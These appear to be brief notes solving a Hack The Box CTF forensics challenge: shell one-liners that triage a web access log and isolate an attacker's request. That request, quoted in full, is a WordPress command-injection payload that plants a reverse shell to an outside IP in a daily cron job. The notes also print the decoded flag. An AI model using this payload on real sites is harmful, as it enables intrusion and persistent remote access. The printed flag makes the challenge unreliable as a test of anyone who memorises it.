https://github.com/hackthebox/htboo-ctf-2023/tree/main/htboo-ctf-2023/forensics/%5BVery%20Easy%5D%20Vulnerable%20Season
https://godylockz.github.io/posts/forensics_vulnerableseason/




cat access.log | awk '{print $1}' | sort | uniq -c | sort -n
     16 ::1
     94 192.168.25.154
    148 68.124.212.176
    456 192.168.25.1
  11020 82.179.92.206



  cat access.log | grep 82.179.92.206 | awk -F\" '{print $6}' | sort | uniq -c | sort -n
     84 Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
  10936 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36



  cat access.log | grep 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'  | tail -n 1
82.179.92.206 - - [28/Sep/2023:05:21:22 -0400] "GET /wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:echo%20%22sh%20-i%20%3E&%20/dev/tcp/82.179.92.206/7331%200%3E&1%22%20%3E%20/etc/cron.daily/testconnect%20&&%20Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo%20$Mz$Tz$Vz$az$Kz$Oz|base64%20-d|rev:NULL:NULL HTTP/1.1" 200 512 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"



/wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:echo "sh -i >& /dev/tcp/82.179.92.206/7331 0>&1" > /etc/cron.daily/testconnect && Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo $Mz$Tz$Vz$az$Kz$Oz|base64 -d|rev


Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo $Mz$Tz$Vz$az$Kz$Oz|base64 -d|rev
HTB{L0g_@n4ly5t_4_bEg1nN3r}



HTB{L0g_@n4ly5t_4_bEg1nN3r}